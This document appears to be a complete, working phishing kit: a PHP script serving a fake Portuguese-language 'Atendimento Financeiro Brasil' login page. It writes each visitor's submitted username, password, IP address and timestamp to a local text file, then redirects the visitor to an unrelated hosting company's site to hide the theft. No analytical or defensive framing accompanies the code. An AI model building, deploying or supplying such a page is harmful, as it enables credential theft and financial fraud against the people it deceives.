<?php
/* ---------- CONFIG ---------- */
$logFile = 'dados.txt';          // arquivo que ficará no mesmo dir
$redirectAfter = 4;              // segundos até jogar pra fora

/* ---------- GRAVA SE VIER POST ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip   = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $hora = date('d/m/Y H:i:s');
    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    $linha = "$hora | $ip | $user | $pass" . PHP_EOL;
    file_put_contents($logFile, $linha, FILE_APPEND | LOCK_EX);

    /* resposta mínima + redireciona */
    echo '<meta http-equiv="refresh" content="' . $redirectAfter . ';url=https://locaweb.com.br">';
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<title>Atendimento Financeiro Brasil</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
    body{font-family:Arial,Helvetica,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh}
    .box{background:#fff;padding:30px 40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.15);width:100%;max-width:320px}
    .box h2{margin-top:0;text-align:center;color:#004680}
    .box input{width:100%;padding:12px;margin:8px 0 16px;border:1px solid #ccc;border-radius:4px;font-size:15px}
    .box button{width:100%;padding:12px;background:#0073bc;color:#fff;border:0;border-radius:4px;font-size:16px;cursor:pointer}
    .box button:hover{background:#005a9e}
</style>
</head>
<body>
<div class="box">
    <h2>Acesse sua conta</h2>
    <form method="post" autocomplete="off">
        <input name="user" type="text" placeholder="Usuário" required>
        <input name="pass" type="password" placeholder="Senha" required>
        <button type="submit">Entrar</button>
    </form>
</div>
</body>
</html>
